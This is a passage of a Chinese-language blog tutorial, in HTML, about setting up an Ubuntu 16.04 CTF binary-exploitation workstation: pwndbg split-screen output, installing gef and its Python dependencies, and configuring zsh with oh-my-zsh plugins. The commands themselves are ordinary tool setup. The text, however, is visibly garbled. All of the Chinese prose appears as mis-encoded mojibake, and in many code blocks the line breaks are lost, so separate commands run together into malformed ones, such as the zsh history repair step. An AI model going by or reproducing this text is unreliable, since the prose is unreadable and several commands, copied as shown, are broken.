src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA8.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º8.png"></p><hr><h3 id="é…ç½®-pwndbg-åˆ†å±è°ƒè¯•"><a href="#é…ç½®-pwndbg-åˆ†å±è°ƒè¯•" class="headerlink" title="é…ç½® pwndbg åˆ†å±è°ƒè¯•"></a>é…ç½® pwndbg åˆ†å±è°ƒè¯•</h3><blockquote><p>ç”±äº pwndbg è¾“å‡ºçš„ä¿¡æ¯è¾ƒå¤šï¼Œç»å¸¸åœ¨ä¸€é¡µä¸Šçœ‹ä¸å…¨ï¼Œéœ€è¦ä¸Šä¸‹ç¿»æ‰¾ï¼Œçœ¼èŠ±ç¼­ä¹±</p><p>æˆ‘ä»¬å¯ä»¥è®¾ç½® pwndbg åˆ†å±è°ƒè¯•ï¼Œä¸€è¾¹å±å¹•è¾“å…¥å‘½ä»¤ï¼Œä¸€è¾¹å±å¹•æŸ¥çœ‹è¾“å‡ºä¿¡æ¯ï¼Œæé«˜æ•ˆç‡</p></blockquote><h4 id="æ–¹æ³•ä¸€ï¼šä¿®æ”¹-gdbinit"><a href="#æ–¹æ³•ä¸€ï¼šä¿®æ”¹-gdbinit" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä¿®æ”¹ gdbinit"></a>æ–¹æ³•ä¸€ï¼šä¿®æ”¹ gdbinit</h4><p>é…ç½®å¾ˆç®€å•ï¼Œå…ˆåæ‰“å¼€ä¸¤ä¸ªç»ˆç«¯</p><p>å‡è®¾å…ˆæ‰“å¼€çš„ä¸€ä¸ªç»ˆç«¯ç”¨äºå¼€å¯ gdb è°ƒè¯•å¹¶è¾“å…¥è°ƒè¯•å‘½ä»¤ï¼Œåæ‰“å¼€çš„ä¸€ä¸ªç»ˆç«¯ç”¨äºè¾“å‡ºè°ƒè¯•ä¿¡æ¯</p><p>åœ¨ä¸¤ä¸ªç»ˆç«¯åˆ†åˆ«è¾“å…¥ <code>tty</code>ï¼Œå…ˆæ‰“å¼€çš„ç»ˆç«¯ä¸º <code>/dev/pts/19</code>ï¼Œåæ‰“å¼€çš„ä¸º <code>/dev/pts/20</code> <em>ï¼ˆä»¥è‡ªå·±çš„å®é™…è¾“å‡ºä¿¡æ¯ä¸ºä¸»ï¼‰</em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A82.png" alt="GDBçš„åŸºç¡€å’Œä½¿ç”¨2.png"></p><p>ä¿®æ”¹ <code>~/.gdbinit</code> ä¸­çš„å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ <code>~/.gdbinit</code> æœ«å°¾åŠ å…¥ä¸€å¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> context-output xxx<span class="token comment"># è¿™é‡Œçš„ xxx å°±æ˜¯ç”¨äºè¾“å‡ºè°ƒè¯•ä¿¡æ¯çš„åˆ†å±ï¼Œæˆ‘è¿™é‡Œæ˜¯ï¼š/dev/pts/20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><mark>æ³¨æ„ï¼šå¦‚æœä½ å¼€äº†å¤šä¸ªç»ˆç«¯ï¼Œå°±è®¾ç½®ä¸ºå®é™…æƒ³è¦ç”¨äºè¾“å‡ºè°ƒè¯•ä¿¡æ¯çš„åˆ†å±</mark></p><p>ä¿å­˜é€€å‡º</p><p>åœ¨å…ˆæ‰“å¼€çš„ç»ˆç«¯ä¸­å¼€å¯ gdb å¹¶è¾“å…¥è°ƒè¯•å‘½ä»¤ï¼Œåœ¨åæ‰“å¼€çš„ç»ˆç«¯ä¸­å³å¯è¾“å‡ºè°ƒè¯•ä¿¡æ¯</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A83.png" alt="GDBçš„åŸºç¡€å’Œä½¿ç”¨3.png"></p><p>ç„¶åæˆ‘ä»¬å°†å±å¹•è°ƒæ•´ä¸€ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A84.png" alt="GDBçš„åŸºç¡€å’Œä½¿ç”¨4.png"></p><blockquote><p>è®¾ç½®åˆ†å±åï¼Œå¦‚æœåªå¼€å¯ä¸€ä¸ªç»ˆç«¯ï¼Œä½¿ç”¨ gdb å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Exception occurred: context: <span class="token punctuation">[</span>Errno <span class="token number">13</span><span class="token punctuation">]</span> æƒé™ä¸å¤Ÿ: <span class="token string">'/dev/pts/20'</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>class <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">)</span>  For <span class="token function">more</span> info invoke <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-verbose on<span class="token variable">`</span></span> and rerun the <span class="token builtin class-name">command</span>  or debug it by yourself with <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-debugger on<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å†å¼€å¯ä¸€ä¸ªç»ˆç«¯å³å¯è§£å†³ ï¼ˆæ–°å¼€å¯çš„ç»ˆç«¯éœ€ä¸º &#x2F;dev&#x2F;pts&#x2F;20ï¼‰</p></blockquote><hr><h4 id="æ–¹æ³•äºŒï¼šgdb-ä¸´æ—¶è®¾ç½®"><a href="#æ–¹æ³•äºŒï¼šgdb-ä¸´æ—¶è®¾ç½®" class="headerlink" title="æ–¹æ³•äºŒï¼šgdb ä¸´æ—¶è®¾ç½®"></a>æ–¹æ³•äºŒï¼šgdb ä¸´æ—¶è®¾ç½®</h4><p>ç”±äºæœ‰æ—¶å€™æ–°å¼€å¯çš„ç»ˆç«¯å¹¶ä¸æ˜¯æˆ‘ä»¬åœ¨ <code>~/.gdbinit</code> ä¸­è®¾ç½®çš„é‚£ä¸ªç»ˆç«¯ï¼Œé¢‘ç¹æ›´æ”¹ <code>~/.gdbinit</code> ä¸­çš„å†…å®¹æœªå…å¤ªè¿‡éº»çƒ¦</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸åœ¨ <code>~/.gdbinit</code> ä¸­è®¾ç½®ï¼Œè€Œæ˜¯å…ˆåœ¨ä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨ gdb è°ƒè¯•ï¼Œç„¶åå†å¦å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œä½¿ç”¨ <code>tty</code> æŸ¥çœ‹æ–°çš„ç»ˆç«¯çš„åˆ†å±ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tty</span><span class="token comment"># å‡è®¾è¾“å‡ºä¸ºï¼š/dev/pts/18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶ååœ¨ gdb ä¸­ç›´æ¥è®¾ç½®è¾“å‡ºè°ƒè¯•ä¿¡æ¯çš„åˆ†å±ï¼š ï¼ˆä»¥è‡ªå·±ä¸Šä¸€æ­¥å®é™…çš„åˆ†å±ä¿¡æ¯ä¸ºä¸»ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> context-output /dev/pts/18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å°±å¯ä»¥é¿å…æ–°æ‰“å¼€çš„ç»ˆç«¯ä¸æˆ‘ä»¬åœ¨ <code>~/.gdbinit</code> ä¸­è®¾ç½®çš„ç»ˆç«¯ä¸ä¸€è‡´çš„é—®é¢˜</p><hr><h2 id="å®‰è£…-gef"><a href="#å®‰è£…-gef" class="headerlink" title="å®‰è£… gef"></a>å®‰è£… gef</h2><p>æœ€æ–°ç‰ˆå®‰è£…æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/hugsy/gef /opt/gdb_plugins/gef<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>å¦‚æœåœ¨ Ubuntu 16.04 è¿™æ ·çš„è€ç‰ˆæœ¬ä¸­ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œæ‰“å¼€ gdb ä¼šæŠ¥é”™</p><p>ä¸ pwndbg ä¸€æ ·ï¼Œæ˜¯å› ä¸º python ç‰ˆæœ¬å¤ªä½ä¸æ”¯æŒæ–°çš„è¯­æ³•ï¼Œæ— æ³•å®‰è£…æœ€æ–°çš„ gef</p></blockquote><p>Ubuntu 16.04 éœ€è¦åœ¨ <a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a> ä¸­ä¸‹è½½æ—§ç‰ˆæœ¬çš„æºç </p><p>æ¯”å¦‚ 2021 ç‰ˆçš„ gef å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼š<a href="https://github.com/hugsy/gef/releases/tag/2021.10">Release 2021.10 - Royal Kill Â· hugsy&#x2F;gef (github.com)</a></p><p>ç„¶åè§£å‹ç§»åŠ¨åˆ° <code>/opt/gdb_plugins/</code> ç›®å½•ä¸‹ï¼Œåœ¨ <code>/opt/gdb_plugins/gef-2021.10</code> ç›®å½•ä¸‹ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef-2021.10/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å¼€ gdb åå¦‚æœ <code>gef</code> æ˜¾ç¤ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">3</span> <span class="token builtin class-name">command</span> could not be loaded, run <span class="token variable"><span class="token variable">`</span>gef missing<span class="token variable">`</span></span> to know why.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾“å…¥ <code>gef missing</code> æŸ¥çœ‹ç¼ºå¤±çš„åº“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>set-permission<span class="token variable">`</span></span> is missing, reason  â†’  Missing <span class="token variable"><span class="token variable">`</span>keystone-engine<span class="token variable">`</span></span> package, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> keystone-engine<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>ropper<span class="token variable">`</span></span> is missing, reason  â†’  Missing <span class="token variable"><span class="token variable">`</span>ropper<span class="token variable">`</span></span> package <span class="token keyword">for</span> Python, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> ropper<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command <span class="token variable"><span class="token variable">`</span>assemble<span class="token variable">`</span></span> is missing, reason  â†’  Missing <span class="token variable"><span class="token variable">`</span>keystone-engine<span class="token variable">`</span></span> package <span class="token keyword">for</span> Python, <span class="token function">install</span> with: <span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> keystone-engine<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ pip å®‰è£…å¯¹åº”çš„åº“å³å¯</p><p><strong>æ³¨æ„è¦ç”¨ GDB æ‰€ä½¿ç”¨çš„ python ç‰ˆæœ¬å¯¹åº”çš„ pip æ¥å®‰è£…ï¼ŒUbuntu 16.04 çš„ GDB é»˜è®¤ä½¿ç”¨ python 3.5</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º7.png"></p><hr><h2 id="éªŒè¯å®‰è£…"><a href="#éªŒè¯å®‰è£…" class="headerlink" title="éªŒè¯å®‰è£…"></a>éªŒè¯å®‰è£…</h2><ul><li>è‡ªç”¨çš„ <code>~/.gdbinit</code> æ–‡ä»¶å†…å®¹ç¤ºä¾‹ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># source /opt/gdb_plugins/peda/peda.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg-2021.06.22/gdbinit.py<span class="token comment"># source /opt/gdb_plugins/gef-2021.10/gef.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/pwngdb.py<span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/angelheap/gdbinit.pydefine hook-runpython<span class="token function">import</span> angelheapangelheap.init_angelheap<span class="token punctuation">(</span><span class="token punctuation">)</span>endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ç»ˆç«¯è¾“å…¥ <code>gdb</code>ï¼š</p><ol><li>å½“å¯ç”¨ <strong>peda</strong> æ—¶ï¼Œä¼šå‡ºç°ï¼š<code>gdb-peda$ </code></li><li>å½“å¯ç”¨ <strong>pwndbg</strong> æ—¶ï¼Œä¼šå‡ºç°ï¼š<code>pwndbg&gt; </code></li><li>å½“å¯ç”¨ <strong>gef</strong> æ—¶ï¼Œä¼šå‡ºç°ï¼š<code>gefâ¤ </code></li></ol><p>å¦‚æœéªŒè¯å‡ºç°ä¸Šè¿°è¾“å‡ºå†…å®¹ï¼Œ<mark>å¹¶ä¸”åœ¨è¾“å‡ºå†…å®¹ä¹‹å‰æ²¡æœ‰ä»»ä½•æŠ¥é”™æç¤º</mark>ï¼Œåˆ™è¯´æ˜å®‰è£…æˆåŠŸ</p><p>å¦‚æœæ²¡æœ‰å®‰è£…æˆåŠŸï¼Œè¾“å…¥ <code>gdb</code> ä¼šæ˜¾ç¤ºé»˜è®¤çš„ï¼š<code>(gdb) </code></p></blockquote><p><mark>å¦å¤–ï¼Œå¯ä»¥è®¾ç½®è„šæœ¬è‡ªåŠ¨åˆ‡æ¢ä¸åŒçš„ GDB æ’ä»¶ä½¿ç”¨ï¼Œçœå»æ‰‹åŠ¨æ³¨é‡Š <code>~/.gdbinit</code> æ–‡ä»¶çš„éº»çƒ¦ï¼Œå…·ä½“æ–¹æ³•è¯·ç§»æ­¥ã€ŠGDBçš„åŸºç¡€å’Œä½¿ç”¨ã€‹</mark></p><hr><h1 id="é…ç½®-ZSH-ç»ˆç«¯"><a href="#é…ç½®-ZSH-ç»ˆç«¯" class="headerlink" title="é…ç½® ZSH ç»ˆç«¯"></a>é…ç½® ZSH ç»ˆç«¯</h1><blockquote><p>å¯¹æ¯” Ubuntu å’Œ Kali ä¹‹åï¼Œè§‰å¾— Kali çš„<mark>ç»ˆç«¯å†å²å‘½ä»¤è‡ªåŠ¨è¡¥å…¨</mark>çš„åŠŸèƒ½çœŸçš„æ˜¯å¤ªå¥½ç”¨äº†ï¼Œè¿˜æœ‰<mark>å‘½ä»¤è¾“å…¥æ­£ç¡®å’Œé”™è¯¯çš„é«˜äº®æç¤º</mark>ï¼Œç®€ç›´ä¸è¦å¤ªå¥½ç”¨ï¼ŒåŸå› å°±åœ¨äº Kali 2020 ä¹‹åçš„ç‰ˆæœ¬é»˜è®¤ç»ˆç«¯ä¸º zsh</p><p>Ubuntu ä¹Ÿå¯ä»¥å®‰è£… zsh ä½œä¸ºç»ˆç«¯å“¦ï¼Œä¸ç”¨å†ç¾¡æ…•éš”å£ Kali å•¦ï¼Œæ¥ä¸‹æ¥ç”¨ zsh æ‰“é€ ä¸€ä¸ªç©¶æå¥½ç”¨çš„å…¨æ–° Ubuntu ç»ˆç«¯å§</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a href="https://blog.csdn.net/qq_51692609/article/details/121228694">Ubuntuç‰ˆæœ¬å®‰è£…zshã€é…ç½®ohmyzshåŠæ’ä»¶ã€ä¸»é¢˜æ›´æ¢_ubuntu ohmyzsh-CSDNåšå®¢</a></li><li><a href="https://www.bktus.com/archives/2759">è§£å†³oh-my-zsh plugin â€˜zsh-autosuggestionsâ€™ not found ä¸ plugin â€˜zsh-syntax-highlightingâ€™ not foundé—®é¢˜ | BaKanTu union us (bktus.com)</a></li></ol><p><strong>æ³¨æ„ï¼šå®‰è£… <code>zsh</code> åï¼Œä»¥åæ‰€æœ‰è¦å†™å…¥ <code>~/.bashrc</code> çš„é…ç½®å…¨éƒ½åªéœ€è¦å†™å…¥ <code>~/.zshrc</code> å³å¯</strong></p></blockquote><p>å®‰è£… <code>zsh</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zsh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸ºäº†é…ç½® <code>zsh</code>ï¼Œè¿˜å¿…é¡»å®‰è£… <code>zsh</code> çš„é…ç½®å·¥å…· <code>oh my zsh</code>ï¼Œå®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/robbyrussell/oh-my-zsh /opt/oh-my-zsh<span class="token builtin class-name">cd</span> /opt/oh-my-zsh/tools<span class="token function">sh</span> install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¾“å…¥ <code>y</code> å°†é»˜è®¤ shell æ›´æ”¹ä¸ºÂ <code>zsh</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Looking <span class="token keyword">for</span> an existing <span class="token function">zsh</span> config<span class="token punctuation">..</span>.Found /root/.zshrc. Backing up to /root/.zshrc.pre-oh-my-zshUsing the Oh My Zsh template <span class="token function">file</span> and adding it to /root/.zshrc.Time to change your default shell to zsh:Do you want to change your default shell to zsh? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º10.png"></p><p>éªŒè¯å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zsh</span> <span class="token parameter variable">--version</span><span class="token comment"># zsh 5.1.1 (x86_64-ubuntu-linux-gnu)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ·»åŠ åŸæ¥ bash çš„ç¯å¢ƒå˜é‡ï¼Œå°† <code>~/.zshrc</code> çš„ç¬¬äºŒè¡Œå–æ¶ˆæ³¨é‡Šï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA25.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º25.png"></p><p>ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€äº›å¯èƒ½çš„é—®é¢˜ï¼š</p><ol><li>å¦‚æœä½¿ç”¨ <code>zsh</code> è¿‡ç¨‹ä¸­å†å²è®°å½•å‡ºç°é—®é¢˜ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: corrupt <span class="token function">history</span> <span class="token function">file</span> /home/wyy/.zsh_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ é™¤åŸå†å²è®°å½•å¹¶é‡å»ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ~/.zsh_history ~/.zsh_history_badstrings <span class="token parameter variable">-eS</span> ~/.zsh_history_bad <span class="token operator">></span> ~/.zsh_history <span class="token operator">&amp;&amp;</span> fc <span class="token parameter variable">-R</span> ~/.zsh_history<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.zsh_history_bad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‡å¯ç»ˆç«¯å³å¯è§£å†³</p><ol start="2"><li>å¦‚æœå‡ºç°ä»¥ä¸‹æŠ¥é”™ï¼š</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: no matches found: xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¼–è¾‘ <code>~/.zshrc</code> æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨æ–‡ä»¶æœ€ååŠ ä¸Šä¸€å¥ï¼š<code>setopt no_nomatch</code></p><p>ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="é…ç½®-zsh-autosuggestions"><a href="#é…ç½®-zsh-autosuggestions" class="headerlink" title="é…ç½® zsh-autosuggestions"></a>é…ç½® zsh-autosuggestions</h2><blockquote><p>è¿™æ˜¯ä¸€ä¸ªå†å²å‘½ä»¤æ™ºèƒ½æç¤ºæ’ä»¶ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿæ‰§è¡Œå†å²å‘½ä»¤ï¼Œå®ç°ç»ˆç«¯å†å²å‘½ä»¤è‡ªåŠ¨è¡¥å…¨</p></blockquote><p>é€šè¿‡ git å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/oh-my-zsh/plugins<span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰“å¼€ <code>zsh</code> é…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœç´¢ <code>plugins</code>ï¼Œåœ¨ plugins åé¢æ·»åŠ æ’ä»¶ <code>zsh-autosuggestions</code> ï¼ˆæ³¨æ„ä¸åŸæœ‰çš„ git ç©ºæ ¼éš”å¼€ï¼‰</p><p>å¹¶åŠ å…¥æ’ä»¶ <code>zsh-autosuggestions</code> çš„é»˜è®¤ä¿å­˜åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /opt/oh-my-zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º11.png"></p><p>ä¿å­˜é€€å‡ºåï¼Œæ›´æ–° <code>~/.zshrc</code> ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">âœ  ~ <span class="token builtin class-name">source</span> ~/.zshrc<span class="token punctuation">[</span>oh-my-zsh<span class="token punctuation">]</span> plugin <span class="token string">'zsh-autosuggestions'</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ˜¯å› ä¸ºå‰é¢å¹¶æ²¡æœ‰æŠŠæ’ä»¶çš„ä»£ç ä»“åº“å…‹éš†åˆ°æœ¬åœ°ä½ç½®ä¸Šï¼Œæ‰€ä»¥æ’ä»¶å…¶å®å¹¶æ²¡æœ‰è¢«å®‰è£…</p><p>å°†æ’ä»¶å…‹éš†åˆ°æœ¬åœ°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ›´æ–° <code>~/.zshrc</code> ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é—®é¢˜å³å¯è§£å†³</p><p>å®‰è£… <code>zsh-autosuggestions</code> å‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA18.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º18.png"></p><p>å®‰è£… <code>zsh-autosuggestions</code> åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA20.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º20.png"></p><p>ç°è‰²éƒ¨åˆ†å°±æ˜¯ç»ˆç«¯å†å²å‘½ä»¤è‡ªåŠ¨è¡¥å…¨ï¼Œä¸ Kali ç»ˆç«¯ä¸€æ ·</p><hr><h2 id="é…ç½®-zsh-syntax-highlighting"><a href="#é…ç½®-zsh-syntax-highlighting" class="headerlink" title="é…ç½® zsh-syntax-highlighting"></a>é…ç½® zsh-syntax-highlighting</h2><blockquote><p>è¯­æ³•é«˜äº®æ’ä»¶ï¼Œå½“åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤æ—¶ï¼Œè¿™ä¸ªæ’ä»¶å¯ä»¥å¸®åŠ©çº é”™ï¼Œå‘½ä»¤ä¸ºçº¢è‰²ä»£è¡¨é”™è¯¯ï¼Œç»¿è‰²ä»£è¡¨æ­£ç¡®</p></blockquote><p>æ–¹æ³•å’Œé…ç½® <code>zsh-autosuggestions</code> ä¸€æ ·</p><p>é€šè¿‡ git å®‰è£…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/oh-my-zsh/plugins<span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰“å¼€ <code>zsh</code> é…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœç´¢ <code>plugins</code>ï¼Œåœ¨ plugins åé¢æ·»åŠ æ’ä»¶ <code>zsh-syntax-highlighting</code> ï¼ˆç©ºæ ¼éš”å¼€ï¼‰</p><p>å¹¶åŠ å…¥æ’ä»¶ <code>zsh-syntax-highlighting</code> 